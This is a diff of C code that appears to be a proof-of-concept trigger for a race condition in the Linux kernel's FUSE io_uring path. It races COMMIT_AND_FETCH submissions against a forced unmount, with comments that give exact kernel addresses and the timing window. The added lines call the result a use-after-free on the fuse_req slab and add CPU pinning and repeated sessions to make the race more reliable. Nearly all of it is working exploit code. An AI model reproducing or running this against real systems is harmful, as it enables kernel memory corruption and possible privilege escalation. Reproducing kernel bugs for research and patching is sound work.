-    const size_t out_sz = 128 * 1024;
-
-    void **in_bufs  = calloc(NQ, sizeof(void *));
-    void **out_bufs = calloc(NQ, sizeof(void *));
-    struct iovec (*reg_iovs)[2] = calloc(NQ, sizeof(*reg_iovs));
-    if (!in_bufs || !out_bufs || !reg_iovs) { perror("calloc"); goto cleanup_mount; }
-
-    for (int q = 0; q < NQ; q++) {
-        in_bufs[q]  = mmap(NULL, in_sz,  PROT_READ|PROT_WRITE,
-                           MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
-        out_bufs[q] = mmap(NULL, out_sz, PROT_READ|PROT_WRITE,
-                           MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
-        if (in_bufs[q] == MAP_FAILED || out_bufs[q] == MAP_FAILED) {
-            perror("mmap per-queue bufs"); goto cleanup_mount;
-        }
-        reg_iovs[q][0].iov_base = in_bufs[q];  reg_iovs[q][0].iov_len = in_sz;
-        reg_iovs[q][1].iov_base = out_bufs[q]; reg_iovs[q][1].iov_len = out_sz;
-    }
-
-    /* Slot buffer for COMMIT_AND_FETCH sqe->addr (one is enough) */
-    void *slot_buf = mmap(NULL, 4096, PROT_READ|PROT_WRITE,
-                          MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
-    if (slot_buf == MAP_FAILED) { perror("mmap slot"); goto cleanup_mount; }
-
-    printf("[+] nr_queues=%d, per-queue in/out bufs allocated\n", NQ);
-
-    /* 4. Single race session: tight CAF cycling loop vs. concurrent abort */
-    const int CAF_LIMIT = 500000;
-    int caf_count = 0;
-    int warn_hit  = 0;
-
-    printf("[+] Setting up io_uring ring (SQE128, %d entries)...\n", NQ + 64);
-
-    struct uring u = {0};
-    if (uring_setup(&u, (uint32_t)(NQ + 64), IORING_SETUP_SQE128) < 0)
-        goto cleanup_bufs;
-
-    /*
-     * Step A: REGISTER one entry per queue.
-     * Submitted individually — each uring_submit() advances sq_tail so the
-     * next uring_get_sqe() picks a distinct SQE slot (batch submit would
-     * write all NQ SQEs to slot 0, silently losing queues 0..NQ-2).
-     */
-    for (int q = 0; q < NQ; q++) {
-        memset(in_bufs[q], 0, in_sz);
-        struct io_uring_sqe *sqe = uring_get_sqe(&u);
-        memset(sqe, 0, 128);
-        sqe->opcode    = IORING_OP_URING_CMD;
-        sqe->fd        = gfuse_fd;
-        sqe->addr      = (uint64_t)(uintptr_t)reg_iovs[q];
-        sqe->len       = 2;
-        sqe->cmd_op    = FUSE_IO_URING_CMD_REGISTER;
-        sqe->user_data = REGISTER_TAG | (uint64_t)(unsigned char)q;
-        struct fuse_uring_cmd_req *r =
-            (struct fuse_uring_cmd_req *)((char *)sqe + 48);
-        memset(r, 0, sizeof(*r));
-        r->qid = (uint32_t)q;
-        uring_submit(&u, 1);
-    }
-    usleep(20000);
-
+    /* Pin main thread to CPU_CAF for SMP concurrency with abort thread */
     {
-        uint32_t h = __atomic_load_n(u.cq_head, __ATOMIC_ACQUIRE);
-        uint32_t t = __atomic_load_n(u.cq_tail, __ATOMIC_ACQUIRE);
-        int reg_fail = 0;
-        while (h != t) {
-            int32_t  res = u.cqes[h & *u.cq_mask].res;
-            uint64_t ud  = u.cqes[h & *u.cq_mask].user_data;
-            fprintf(stderr, "[-] REGISTER qid=%llu immediate error res=%d\n",
-                    (unsigned long long)(ud & 0xff), res);
-            h++; reg_fail++;
-        }
-        __atomic_store_n(u.cq_head, h, __ATOMIC_RELEASE);
-        if (reg_fail) {
-            fprintf(stderr, "[-] %d REGISTER(s) failed\n", reg_fail);
-            uring_close(&u);
-            goto cleanup_bufs;
-        }
-    }
-    printf("[+] All %d REGISTER SQEs accepted (deferred — no immediate CQE)\n", NQ);
-
-    /*
-     * Step B: Fork persistent child hammering stat() at ~10k ops/s.
-     * stat() → FUSE_LOOKUP → fuse_uring_task_to_queue dispatches to ring
-     * → fuse_uring_send_in_task writes fuse_in_header into in_buf[qid]
-     * → fires CQE on the pending REGISTER (or later CAF) cmd.
-     */
-    char probe[128];
-    snprintf(probe, sizeof probe, "%s/probe", mntdir);
-
-    pid_t child = fork();
-    if (child == 0) {
-        struct stat st;
-        while (1) {
-            stat(probe, &st);
-            usleep(100);   /* 100µs → ~10k FUSE ops/s */
-        }
-        _exit(0);
-    }
-    printf("[+] child pid=%d hammering stat(\"%s\")\n", (int)child, probe);
-
-    /*
-     * Step C: Wait for first REGISTER CQE — first FUSE op dispatched to ring.
-     * user_data = REGISTER_TAG | qid identifies which queue fired.
-     */
-    uint64_t first_ud  = 0;
-    int32_t  first_res = uring_poll_cqe(&u, 2000, &first_ud);
-
-    fprintf(stderr, "  [init] CQE res=%d ud=0x%llx qid=%llu\n",
-            first_res, (unsigned long long)first_ud,
-            (unsigned long long)(first_ud & 0xff));
-
-    if (first_res != 0 || (first_ud & ~0xffULL) != (REGISTER_BASE << 8)) {
-        fprintf(stderr, "[-] Expected REGISTER CQE (ud high=0x%llx res=0), "
-                "got res=%d ud=0x%llx\n",
-                (unsigned long long)(REGISTER_BASE << 8),
-                first_res, (unsigned long long)first_ud);
-        kill(child, SIGKILL); waitpid(child, NULL, 0);
-        uring_close(&u);
-        goto cleanup_bufs;
+        cpu_set_t cs;
+        CPU_ZERO(&cs);
+        CPU_SET(CPU_CAF, &cs);
+        if (sched_setaffinity(0, sizeof(cs), &cs) < 0)
+            fprintf(stderr, "[!] sched_setaffinity CPU%d failed: %s "
+                    "(continuing without pinning)\n", CPU_CAF, strerror(errno));
+        else
+            printf("[+] Main thread pinned to CPU%d\n", CPU_CAF);
     }
 
-    int fired_q = (int)(first_ud & 0xffULL);
-    struct fuse_in_header *ih = (struct fuse_in_header *)in_bufs[fired_q];
-    uint64_t commit_id = ih->unique;
+    int nq = (int)sysconf(_SC_NPROCESSORS_ONLN);
+    printf("[+] nr_queues=%d\n\n", nq);
 
-    fprintf(stderr, "  [init] qid=%d commit_id=%llu opcode=%u\n",
-            fired_q, (unsigned long long)commit_id, ih->opcode);
-
-    if (commit_id == 0) {
-        fprintf(stderr, "[-] in_buf unique==0 — kernel did not write FUSE header\n");
-        kill(child, SIGKILL); waitpid(child, NULL, 0);
-        uring_close(&u);
-        goto cleanup_bufs;
+    if (nq < 2) {
+        fprintf(stderr, "[-] Need >= 2 CPUs for SMP race (found %d)\n", nq);
+        return 1;
     }
 
-    /* Step D: Write response for the first op (CAF loop consumes it). */
-    ring_respond(ih, out_bufs[fired_q]);
+    int total_caf = 0;
+    int warn_hit  = 0;
+    int sessions_run = 0;
 
-    /*
-     * Step E: concurrent abort vs. tight CAF cycling loop.
-     *
-     * abort_thread fires umount2(MNT_FORCE|MNT_DETACH) after delay_ms:
-     *   fuse_abort_conn
-     *     → fuse_uring_abort_end_requests: movb $1,0xa4(%rbx)  (no spinlock)
-     *     → fuse_uring_stop_queues → fuse_uring_stop_list_entries:
-     *         first loop (spinlock): ring_ent->state = 5, req kept in req_hash
-     *         second loop (spinlock): removes req from req_hash, state = 6
-     *
-     * Main thread: each CAF iteration enters fuse_uring_commit_fetch:
-     *   0x81701cc4: movzbl 0xa4(%r13),%eax   ← reads queue+0xa4 (NO spinlock)
-     *   0x81701cce: jne → -ENODEV             ← normal abort path if flag=1
-     *   0x81701cde: call spin_lock            ← memory barrier
-     *   0x81701d31: cmpl $0x4,0x30(%rbx)     ← state check under spinlock
-     *   0x81701d39: jne 0x81701e86           ← ud2 if state != 4
-     *
-     * Race: abort_end_requests writes queue+0xa4=1 between the movzbl (a)
-     * and spin_lock (b).  On a preemptible kernel, a timer interrupt in that
-     * ~30ns window lets the abort thread run fully (sets queue+0xa4=1 AND
-     * state=5), then commit_fetch resumes with stale 0 in its register,
-     * acquires spinlock, finds state=5 → WARN_ON at 0x81701e86.
-     *
-     * Distinguishing outcomes:
-     *   CAF CQE res == -EPROTO  → WARN_ON path (race triggered)
-     *   CAF CQE res == -ENODEV  → clean abort  (queue+0xa4 guard fired)
-     *   CAF CQE res == -EAGAIN  → timeout (no FUSE op arrived in 500ms)
-     */
-    struct abort_args aargs = { .mntdir = mntdir, .delay_ms = 300 };
-    pthread_t abort_tid;
-    pthread_create(&abort_tid, NULL, abort_thread_fn, &aargs);
+    for (int sess = 0; sess < N_SESSIONS; sess++) {
+        sessions_run = sess + 1;
 
-    printf("[+] CAF cycling loop started (abort fires in %dms, limit=%d)\n",
-           aargs.delay_ms, CAF_LIMIT);
-    fflush(stdout);
+        if (sess % 20 == 0)
+            printf("[*] Session %d/%d  total_caf=%d\n",
+                   sess, N_SESSIONS, total_caf);
 
-    for (int i = 0; i < CAF_LIMIT; i++) {
-        submit_caf(&u, gfuse_fd, slot_buf, commit_id, (uint32_t)fired_q);
-        uring_submit(&u, 1);
-        caf_count++;
+        int r = run_session(sess, nq, &total_caf);
 
-        uint64_t ud  = 0;
-        int32_t  res = uring_poll_cqe(&u, 500, &ud);
-
-        if (res == -EPROTO) {
-            /*
-             * commit_fetch recovery path: ud2 fired at 0x81701e86, then
-             * spin_unlock → fuse_req->error=-EPROTO → fuse_request_end →
-             * return -EPROTO → io_uring_cmd_done(cmd, -EPROTO) → this CQE.
-             */
-            printf("[!] *** WARN_ON TRIGGERED *** iter=%d CAF returned -EPROTO\n", i);
-            printf("    ring_ent->state==5 seen under spinlock in commit_fetch\n");
-            printf("    ud2 at 0xffffffff81701e86 fired — check dmesg for WARNING:\n");
+        if (r == 1) {
             warn_hit = 1;
             break;
         }
-        if (res != 0) {
-            printf("[*] CAF loop ended: iter=%d res=%d (%s)\n", i, res,
-                   res == -ENODEV ? "-ENODEV (clean abort, queue+0xa4 guard)" :
-                   res == -EAGAIN ? "-EAGAIN (timeout)" :
-                   res == -EINVAL ? "-EINVAL" : "other");
-            break;
+        if (r < 0 && sess == 0) {
+            fprintf(stderr, "[-] Session 0 setup failed — aborting\n");
+            return 1;
         }
-
-        /* Next op arrived in in_buf; get its commit_id for the next CAF. */
-        uint64_t new_id = ih->unique;
-        if (new_id == 0 || new_id == commit_id) {
-            usleep(50);
-            new_id = ih->unique;
-            if (new_id == 0 || new_id == commit_id)
-                break;
-        }
-        commit_id = new_id;
-        ring_respond(ih, out_bufs[fired_q]);
     }
 
-    pthread_join(abort_tid, NULL);
-    kill(child, SIGKILL);
-    waitpid(child, NULL, 0);
-    uring_close(&u);
+    printf("\n=== Results ===\n");
+    printf("Sessions run:      %d / %d\n", sessions_run, N_SESSIONS);
+    printf("Total CAF iters:   %d\n", total_caf);
+    printf("WARN_ON triggered: %s\n\n", warn_hit ? "YES" : "no");
 
-    printf("\n[+] Race session complete\n");
-    printf("    CAF iterations:    %d\n", caf_count);
-    printf("    WARN_ON triggered: %s\n", warn_hit ? "YES" : "no");
-    printf("\n");
-
-    printf("  --- dmesg (last 30 lines) ---\n");
-    system("dmesg 2>/dev/null | tail -30 | sed 's/^/  /'");
-    printf("  --- end dmesg ---\n\n");
-
-    printf("  FUSE/WARNING hits:\n");
+    printf("  --- dmesg FUSE/kernel BUG hits ---\n");
     system("dmesg 2>/dev/null | grep -iE "
-           "'WARNING:|fuse.*uring|ud2|invalid opcode|BUG:|KASAN' "
-           "| tail -15 | sed 's/^/    /' || echo '    (none)'");
+           "'WARNING:|fuse.*uring|ud2|invalid opcode|BUG:|KASAN|use.after.free' "
+           "| tail -20 | sed 's/^/    /' || echo '    (none)'");
     printf("\n");
 
     if (warn_hit) {
         printf("[!] Race confirmed: fuse_uring_commit_fetch saw state=5 under "
                "spinlock.\n");
-        printf("    WARN_ON at 0xffffffff81701e86 triggered.\n");
+        printf("    WARN_ON at 0xffffffff81701e86 — double fuse_request_end "
+               "→ UAF on fuse_req slab.\n");
+        printf("    Check dmesg for KASAN/WARNING report.\n");
     } else {
-        printf("[*] WARN_ON not triggered this run.\n");
-        printf("    -ENODEV = queue+0xa4 guard always fired before spinlock.\n");
-        printf("    Try: PREEMPT_DYNAMIC kernel, more CPUs, reduce abort delay.\n");
+        printf("[*] WARN_ON not triggered in %d sessions (%d CAF iters).\n",
+               sessions_run, total_caf);
+        printf("    Options: increase N_SESSIONS, use 'preempt=full' boot param,\n");
+        printf("    or verify CPU%d and CPU%d are online.\n",
+               CPU_CAF, CPU_ABORT);
     }
 
-cleanup_bufs:
-    for (int q = 0; q < NQ; q++) {
-        if (in_bufs[q]  && in_bufs[q]  != MAP_FAILED) munmap(in_bufs[q],  in_sz);
-        if (out_bufs[q] && out_bufs[q] != MAP_FAILED) munmap(out_bufs[q], out_sz);
-    }
-    free(in_bufs); free(out_bufs); free(reg_iovs);
-    if (slot_buf != MAP_FAILED) munmap(slot_buf, 4096);
-
-cleanup_mount:
-    gdaemon_stop = 1;
-    umount2(mntdir, MNT_DETACH);   /* ignore EINVAL if abort_thread already unmounted */
-    close(gfuse_fd);
-    pthread_join(dtid, NULL);
-    rmdir(mntdir);
-
-    printf("[+] Done.\n");
-    return 0;
+    return warn_hit ? 0 : 2;
 }
